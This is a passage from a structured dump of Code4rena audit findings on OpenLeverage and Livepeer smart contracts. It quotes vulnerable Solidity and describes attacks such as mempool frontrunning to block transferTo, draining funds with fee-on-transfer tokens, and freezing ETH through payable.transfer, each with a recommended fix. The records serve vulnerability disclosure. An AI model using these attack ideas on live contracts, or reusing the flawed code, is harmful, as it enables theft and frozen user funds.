\"@openzeppelin/contracts/utils/math/SafeMath.sol\";   "}, {"title": "Anyone can crash transferTo", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/261", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function transferTo allows transferring amount from beneficiary to any address. However, 'to' is considered valid when it does not have an amount locked yet: ```solidity  function transferTo(address to, uint amount) external  ...    require(releaseVars[to].amount == 0, 'to is exist');  ``` It locks this amount for releaseVars[beneficiary].endTime. Because the blockchain is public, a malicious actor could monitor the mempool, and crash any attempt of transferTo by frontrunning it and calling transferTo with the smallest fraction (dust) from his own address to the 'to' address, making it unavailable to receive new locks for some time (even 4 years is possible?).  ## Recommended Mitigation Steps A few possible solutions would be to introduce a reasonable minimum amount to transfer or add a 2-step approval, where 'to' first have to approve the beneficiary.  "}, {"title": "transfer() may break in future ETH upgrade", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/228", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact `transfer()` only forward 2300 gas which may break when gas cost change in a future ETH upgrade see: https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253 ```             payable(to).transfer(amount); ```  ## Recommended Mitigation Steps use call() instead  "}, {"title": "Funds can be lost", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/220", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  csanuragjain   # Vulnerability details  ## Impact User funds can be lost if Admin sets startTimes[i] to 0  ## Proof of Concept  1. Navigate to contract https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/farming/FarmingPools.sol  2. Check the initDistributions function  ``` function initDistributions(address[] memory stakeTokens, uint64[] memory startTimes, uint64[] memory durations) external onlyAdmin {         for (uint256 i = 0; i < stakeTokens.length; i++) {             require(distributions[stakeTokens[i]].starttime == 0, 'Init once');             distributions[stakeTokens[i]] = Distribution(durations[i], startTimes[i], 0, 0, 0, 0, 0);         }     } ```  3. Assume Admin calls this for token X with startTimes[i] as 0. This creates a new distribution with start time as 0 for token X  4. User Y stakes amount 500 for this token X  5. Admin calls initDistributions again with token X and startTimes[i] as 1000. This overwrites and reinitializes distributions[X] which means totalStaked becomes 0 and contract has lost all track of user funds now  ## Recommended Mitigation Steps Add a check to see startTimes[i]!=0 in initDistributions function  "}, {"title": "Unused library `ReentrancyGuard`", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/209", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  WatchPug   # Vulnerability details  The library `ReentrancyGuard` is imported and inherited, but the modifier `nonReentrant` is unused.  https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/liquidity/LPoolDepositor.sol#L14-L14  ```solidity contract LPoolDepositor is ReentrancyGuard { ```  ### Recommendation  Remove the import and change to:  ```solidity contract LPoolDepositor { ```  "}, {"title": "`UniV2ClassDex.sol#uniClassSell()` Tokens with fee on transfer are not fully supported", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/208", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L31-L56  ```solidity function uniClassSell(DexInfo memory dexInfo,     address buyToken,     address sellToken,     uint sellAmount,     uint minBuyAmount,     address payer,     address payee ) internal returns (uint buyAmount){     address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);     IUniswapV2Pair(pair).sync();     (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();     sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);     uint balanceBefore = IERC20(buyToken).balanceOf(payee);     dexInfo.fees = getPairFees(dexInfo, pair);     if (buyToken < sellToken) {         buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);         IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");     } else {         buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);         IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");     }      require(buyAmount >= minBuyAmount, 'buy amount less than min');     uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);     return bought; } ```  While `uniClassBuy()` correctly checks the actually received amount by comparing the before and after the balance of the receiver, `uniClassSell()` trusted the result given by `getAmountOut()`. This makes `uniClassSell()` can result in an output amount fewer than `minBuyAmount`.  https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L101-L102  ### Recommendation  Change to:  ```solidity function uniClassSell(DexInfo memory dexInfo,     address buyToken,     address sellToken,     uint sellAmount,     uint minBuyAmount,     address payer,     address payee ) internal returns (uint bought){     address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);     IUniswapV2Pair(pair).sync();     (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();     sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);     uint balanceBefore = IERC20(buyToken).balanceOf(payee);     dexInfo.fees = getPairFees(dexInfo, pair);     if (buyToken < sellToken) {         buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);         IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");     } else {         buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);         IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");     }     uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);     require(bought >= minBuyAmount, 'buy amount less than min'); } ```  "}, {"title": "endTime can be before startTime", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/160", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  samruna   # Vulnerability details  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OLETokenLock.sol#L66  In the above code, there is no check to see if endTime is before startTime. Due to this past beneficiaries can be transferred additional tokens  Action: check if endTime if always in future.  "}, {"title": "Gas: Tautology on \"variable >= 0\" which is always true as variable is uint", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/132", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Increased gas cost, as a variable of type `uint` will always be `>= 0`, therefore the check isn't necessary.    ## Proof of Concept   ``` contracts\\XOLE.sol:327:        require(_locked.amount >= 0, \"Nothing to withdraw\"); ```   ## Tools Used   VS Code      ## Recommended Mitigation Steps   Delete the `>= 0` check  "}, {"title": "OpenLevV1.closeTrade with V3 DEX doesn't correctly accounts fee on transfer tokens for repayments", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/104", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  The amount that OpenLevV1 will receive can be less than V3 DEX indicated as a swap result, while it is used as given for position debt repayment accounting.  This way actual funds received can be less than accounted, leaving to system funds deficit, which can be exploited by a malicious user, draining contract funds with multiple open/close with a taxed token.  In the `trade.depositToken != longToken` case when `flashSell` is used this can imply inability to send remainder funds to a user and the failure of the whole closeTrade function, the end result is a freezing of user's funds within the system.  ## Proof of Concept  `trade.depositToken != longToken` case, can be wrong repayment accounting, which will lead to a deficit if the received funds are less than DEX returned `closeTradeVars.receiveAmount`.  As a side effect, `doTransferOut` is done without balance check, so the whole position close can revert, leading to inability to close the position and freeze of user's funds this way:  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L197-204   I.e. if there is enough funds in the system they will be drained, if there is not enough funds, user's position close will fail.   V3 sell function doesn't check for balance change, using DEX returned amount as is:  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/eth/UniV3Dex.sol#L61-70  ## Recommended Mitigation Steps  If fee on tranfer tokens are fully in scope, do control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic as well.  "}, {"title": "transferAllowed does not fail", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/83", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  GeekyLumberjack   # Vulnerability details  ## Impact [transferTokens()](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L95-L135) will not fail when calling [transferAllowed()](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/ControllerV1.sol#L88-L91) both [transfer()](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L141) and [transferFrom()](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L150) rely on transferTokens(). Both the name of the function transferAllowed() and the [comments](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L99) above the call show there should be some cases that cause these functions to fail in transferAllowed.   ## Tools Used Manual review  ## Recommended Mitigation Steps Update transfer allowed to include required failures. If there are none, update the comments and the name of the function.  "}, {"title": "FarmingPools' notifyRewardAmounts and initDistributions do not check the lengths of input arrays", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/76", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  hyh   # Vulnerability details   ## Impact  On calling with arrays of different lengths various malfunctions are possible as the arrays are used as given. System then will fail with low level array access message  ## Proof of Concept  notifyRewardAmounts:  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/farming/FarmingPools.sol#L163   initDistributions:  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/farming/FarmingPools.sol#L131  ## Recommended Mitigation Steps  Require that (stakeTokens, reward) and (stakeTokens, startTimes, durations) arrays' lengths match within each set   "}, {"title": "OpenLevV1Lib's and LPool's doTransferOut functions call native payable.transfer, which can be unusable for smart contract calls", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/75", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  When OpenLev operations use a wrapped native token, the whole user withdraw is being handled with a `payable.transfer()` call.  This is unsafe as `transfer` has hard coded gas budget and can fail when the user is a smart contract. This way any programmatical usage of OpenLevV1 and LPool is at risk.  Whenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time.  As OpenLevV1 `closeTrade` is affected this includes user's principal funds freeze scenario, so marking the issue as a high severity one.  ## Proof of Concept  OpenLevV1Lib and LPool have `doTransferOut` function that calls native token payable.transfer:  OpenLevV1Lib.doTransferOut  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253   LPool.doTransferOut  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L297   LPool.doTransferOut is used in LPool redeem and borrow, while OpenLevV1Lib.doTransferOut is used in OpenLevV1 trade manipulation logic:  closeTrade  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L204  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L215   liquidate  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L263  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L295  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L304   ## References  The issues with `transfer()` are outlined here:  https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/   ## Recommended Mitigation Steps  OpenLevV1's `closeTrade` and `liquidate` as well as LPool's `redeem`, `redeemUnderlying`, `borrowBehalf`, `repayBorrowBehalf`, `repayBorrowEndByOpenLev` are all `nonReentrant`, so reentrancy isn't an issue and `transfer()` can be just replaced.  Using low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60  "}, {"title": "pass the `dexInfo[dexName[i]` value without caching `DexInfo struct`", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  rfa   # Vulnerability details  ## Impact expensive gas ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/bsc/BscDexAggregatorV1.sol#L47   ## Recommended Mitigation Steps replace the 2 lines of code by just 1 line: ``` dexInfo[dexName[i]] = DexInfo(factoryAddr[i], fees[i]); ```  "}, {"title": "No Transfer Ownership Pattern", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/65", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact The current ownership transfer process involves the current owner calling transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner\u2019s address into the owner\u2019s state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier.  ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/Airdrop.sol#L9  ## Tools Used  None  ## Recommended Mitigation Steps  Implement zero address check and consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.   "}, {"title": "Missing payable", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/61", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  robee   # Vulnerability details  The following functions are not payable but uses msg.value - therefore the function must be payable. This can lead to undesired behavior.          LPool.sol, addReserves should be payable since using msg.value   "}, {"title": "Use of tx.origin in ControllerV1.sol", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/60", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In ControllerV1.sol in the updatePriceAllowed() function tx.origin is used.  tx.origin is a global variable in Solidity which returns the address of the account that sent the transaction. Using the variable could make a contract vulnerable if an authorized account calls into a malicious contract.  ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/ControllerV1.sol#L163  https://swcregistry.io/docs/SWC-115  ## Tools Used Manual code review   ## Recommended Mitigation Steps Its recommended to use msg.sender instead  "}, {"title": "Anyone can call release() in OLETokenLock.sol", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/56", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In OLETokenLock.sol,  the release() function distributes all the allotted tokens to the beneficiaries but it can be called by anyone.  This should be an admin protected function as it's very important and deals with the transfer of tokens to beneficiaries which should not be accessed by simply anyone.   ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OLETokenLock.sol#L39  ## Tools Used Manual code review   ## Recommended Mitigation Steps OLETokenLock.sol should inherit the Adminable.sol contract and add require(msg.sender = admin, \"Not Authorized\"); to the release() function.   "}, {"title": "Assert instead require to validate user inputs", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/43", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  mics   # Vulnerability details  From solidity docs: Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix. With assert the user pays the gas and with require it doesn't. The ETH network gas isn't cheap and users can see it as a scam.  You have reachable asserts in the following locations (which should be replaced by require / are mistakenly left from development phase):          FarmingPools.sol : reachable assert in line 77         XOLE.sol : reachable assert in line 303   "}, {"title": "Gas: use `msg.sender` instead of OpenZeppelin's `_msgSender()` when GSN capabilities aren't used", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/243", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact `msg.sender` costs 2 gas (CALLER opcode). `_msgSender()` represents the following: ``` function _msgSender() internal view virtual returns (address payable) {     return msg.sender; } ``` When no GSN capabilities are used: `msg.sender` is enough.  See https://docs.openzeppelin.com/contracts/2.x/gsn for more information about GSN capabilities.  ## Proof of Concept Instances include: ``` arbitrum-lpt-bridge\\contracts\\L1\\escrow\\L1Escrow.sol:18:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());     arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:133:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:83:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); arbitrum-lpt-bridge\\contracts\\L2\\token\\LivepeerToken.sol:13:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); arbitrum-lpt-bridge\\contracts\\ControlledGateway.sol:19:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Replace `_msgSender()` with `msg.sender`  "}, {"title": "Fund loss when insufficient call value to cover fee", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/238", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Fund can be lost if the L1 call value provided is insufficient to cover `_maxSubmissionCost`, or stuck if insufficient to cover `_maxSubmissionCost + (_maxGas * _gasPriceBid)`.  ## Proof of Concept `outboundTransfer` in `L1LPTGateway` does not check if the call value is sufficient, if it is `< _maxSubmissionCost` the retryable ticket creation will fail and fund is lost; if it is `<_maxSubmissionCost + (_maxGas * _gasPriceBid)` the ticket would require manual execution.  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1LPTGateway.sol#L80 ```     function outboundTransfer(         address _l1Token,         address _to,         uint256 _amount,         uint256 _maxGas,         uint256 _gasPriceBid,         bytes calldata _data     ) external payable override whenNotPaused returns (bytes memory) {         require(_l1Token == l1Lpt, \"TOKEN_NOT_LPT\");          // nested scope to avoid stack too deep errors         address from;         uint256 seqNum;         bytes memory extraData;         {             uint256 maxSubmissionCost;             (from, maxSubmissionCost, extraData) = parseOutboundData(_data);             require(extraData.length == 0, \"CALL_HOOK_DATA_NOT_ALLOWED\");              // transfer tokens to escrow             TokenLike(_l1Token).transferFrom(from, l1LPTEscrow, _amount);              bytes memory outboundCalldata = getOutboundCalldata(                 _l1Token,                 from,                 _to,                 _amount,                 extraData             );              seqNum = sendTxToL2(                 l2Counterpart,                 from,                 maxSubmissionCost,                 _maxGas,                 _gasPriceBid,                 outboundCalldata             );         }          emit DepositInitiated(_l1Token, from, _to, seqNum, _amount);          return abi.encode(seqNum);     } ```  ## Recommended Mitigation Steps Add check similar to the one used in `L1GatewayRouter` provided by Arbitrum team  https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/ethereum/gateway/L1GatewayRouter.sol#L236 ```         uint256 expectedEth = _maxSubmissionCost + (_maxGas * _gasPriceBid);         require(_maxSubmissionCost > 0, \"NO_SUBMISSION_COST\");         require(msg.value == expectedEth, \"WRONG_ETH_VALUE\"); ```  "}, {"title": "Migrate old balance on setToken", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/234", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact In contract BridgeMinter function setToken, it just sets the new tokenAddr, but it does not process the old token balance leaving it stuck in the contract. I think that setToken could also migrate the old balance somewhere before updating the token address. I can even suggest adding token rescue functions to the contracts that may come in handy in such cases or if someone accidentally sends the tokens directly to the contract. An owner can rescue the tokens if the token is not protected (e.g. intended to be held in the contract).  ## Recommended Mitigation Steps An example implementation that could help to rescue old token balance: ```solidity   function withdrawLPTToL1Migrator(address _tokenAddr, address _recipient) external onlyControllerOwner returns (uint256) {       require(_tokenAddr != tokenAddr, \"protected\");        IERC20 token = IERC20(_tokenAddr);        uint256 balance = token.balanceOf(address(this));        token.transfer(_recipient, balance);        return balance;   } ```  "}, {"title": "Don't assign default values", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/215", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  0x0x0x   # Vulnerability details  ## Concept  When a variable is declared solidity assigns the default value. In case the contract assigns the value again, it costs extra gas.   Example:`uint x = 0` costs more gas than `uint x` without having any different functionality.  Scope  ``` ./protocol/bonding/libraries/EarningsPool.sol:84:        uint256 delegatorFees = 0; ./protocol/bonding/libraries/EarningsPool.sol:85:        uint256 transcoderFees = 0; ./protocol/bonding/libraries/EarningsPool.sol:115:        uint256 delegatorRewards = 0; ./protocol/bonding/libraries/EarningsPool.sol:116:        uint256 transcoderRewards = 0; ./protocol/bonding/libraries/EarningsPool.sol:189:        uint256 transcoderFees = 0; ./protocol/bonding/libraries/EarningsPool.sol:190:        uint256 delegatorFees = 0; ./protocol/bonding/libraries/EarningsPool.sol:217:        uint256 transcoderRewards = 0; ./protocol/bonding/libraries/EarningsPool.sol:218:        uint256 delegatorRewards = 0; ./protocol/pm/mixins/MixinTicketBrokerCore.sol:121:        uint256 amountToTransfer = 0; ./protocol/token/Minter.sol:223:        uint256 currentBondingRate = 0; ./arbitrum-lpt-bridge/L1/gateway/L1Migrator.sol:471:        uint256 total = 0; ./protocol/zeppelin/MintableToken.sol:17:    bool public mintingFinished = false; ./protocol/zeppelin/Pausable.sol:13:    bool public paused = false;  ```  "}, {"title": "Don't use deprecated library functions", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/207", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  byterocket   # Vulnerability details  ## Impact  The `_setupRole` function in OpenZeppelin's `AccessControl` contract is marked as deprecated in favor of `_grantRole`. See [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/AccessControl.sol#L183).  Following contracts use the deprecated `_setupRole` in their constructor: ``` arbitrum-lpt-bridge:   - ControlledGateway.sol   - L1/escrow/L1Escrow.sol   - L2/gateway/L2Migrator.sol   - token/LivepeerToken.sol   - L1/gateway/L1Migrator.sol ```  ## Recommended Mitigation Steps  Refactor the contracts constructor's to use `_grantRole` instead of `_setupRole`.  "}, {"title": "[WP-H5] `L1Migrator.sol#migrateETH()` dose not send `bridgeMinter`'s ETH to L2 causing ETH get frozen in the contract", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/205", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  Per the `arb-bridge-eth` code:  > all msg.value will deposited to callValueRefundAddress on L2  https://github.com/OffchainLabs/arbitrum/blob/78118ba205854374ed280a27415cb62c37847f72/packages/arb-bridge-eth/contracts/bridge/Inbox.sol#L313  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1ArbitrumMessenger.sol#L65-L74  ```solidity uint256 seqNum = inbox.createRetryableTicket{value: _l1CallValue}(     target,     _l2CallValue,     maxSubmissionCost,     from,     from,     maxGas,     gasPriceBid,     data ); ```  At L308-L309, ETH held by `BridgeMinter` is withdrawn to L1Migrator:  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L309  ```solidity         uint256 amount = IBridgeMinter(bridgeMinterAddr)             .withdrawETHToL1Migrator(); ```  However, when calling `sendTxToL2()` the parameter `_l1CallValue` is only the `msg.value`, therefore, the ETH transferred to L2 does not include any funds from `bridgeMinter`.   https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L318-L327  ```solidity     sendTxToL2(         l2MigratorAddr,         address(this), // L2 alias of this contract will receive refunds         msg.value,         amount,         _maxSubmissionCost,         _maxGas,         _gasPriceBid,         \"\"     ) ```  As a result, due to lack of funds, `call` with value = amount to `l2MigratorAddr` will always fail on L2.  Since there is no other way to send ETH to L2, all the ETH from `bridgeMinter` is now frozen in the contract.  ### Recommendation  Change to:  ```solidity     sendTxToL2(         l2MigratorAddr,         address(this), // L2 alias of this contract will receive refunds         msg.value + amount, // the `amount` withdrawn from BridgeMinter should be added         amount,         _maxSubmissionCost,         _maxGas,         _gasPriceBid,         \"\"     ) ```  "}, {"title": "`L1LPTGateway`, `L2LPTGateway` should start off paused after deployed", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/203", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  Per the document: https://github.com/livepeer/LIPs/blob/master/LIPs/LIP-73.md#upgrade-process  > *Phase 1* > > - The L1 RoundsManager will be upgraded to disable round initialization at `LIP_73_ROUND` > - During this phase, protocol transactions will be executed normally > - During this phase, the following contracts will be deployed: >     - Protocol contracts on L2 >     - Migrator contracts on L1 and L2 >     - LPT bridge contracts on L1 and L2 >     - ***All of these contracts will start off paused***  However, the current implementation of `L1LPTGateway`, `L2LPTGateway` are not automatically paused on deployment.  We recommend adding `_pause()` to the end of the `constructor()` in `L1LPTGateway`, `L2LPTGateway`, like the constructor of [L1Migrator.sol#L143](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L143-L143), and `unpause()` when Phase 2 starts.   This will help avoid tx to happen in an intermediate state between Phase1 and Phase 2, which may cause certain txs to fail, for instance:  When in Phase 1, `L1LPTGateway` cant calls `bridgeMint()` on the `BridgeMinter` to mint LPT to the user, as L1 Minter have not `migrateToNewMinter()` to `BridgeMinter` yet. If a user in L2 tries to move `LPT` from L2 to L1, their tx may fail.  "}, {"title": "[WP-M4] Unable to use `L2GatewayRouter` to withdraw LPT from L2 to L1, as `L2LPTGateway` does not implement `L2GatewayRouter` expected method", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/202", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  Per the document: https://github.com/code-423n4/2022-01-livepeer#l2---l1-lpt-withdrawal  > The following occurs when LPT is withdrawn from L2 to L1:  > The user initiates a withdrawal for X LPT. This can be done in two ways: a. Call outboundTransfer() on L2GatewayRouter which will call outboundTransfer() on L2LPTGateway b. Call outboundTransfer() directly on L2LPTGateway  The method (a) described above won't work in the current implementation due to the missing interface on `L2LPTGateway`.  When initiate a withdraw from the Arbitrum Gateway Router, `L2GatewayRouter` will call `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` on `ITokenGateway(gateway)`:  ```solidity function outboundTransfer(     address _token,     address _to,     uint256 _amount,     uint256 _maxGas,     uint256 _gasPriceBid,     bytes calldata _data ) external payable returns (bytes memory); ```  https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/arbitrum/gateway/L2GatewayRouter.sol#L57-L64  ```solidity function outboundTransfer(     address _l1Token,     address _to,     uint256 _amount,     bytes calldata _data ) public payable returns (bytes memory) {     return outboundTransfer(_l1Token, _to, _amount, 0, 0, _data); } ```  https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/libraries/gateway/GatewayRouter.sol#L78-L102  ```solidity function outboundTransfer(     address _token,     address _to,     uint256 _amount,     uint256 _maxGas,     uint256 _gasPriceBid,     bytes calldata _data ) public payable virtual override returns (bytes memory) {     address gateway = getGateway(_token);     bytes memory gatewayData = 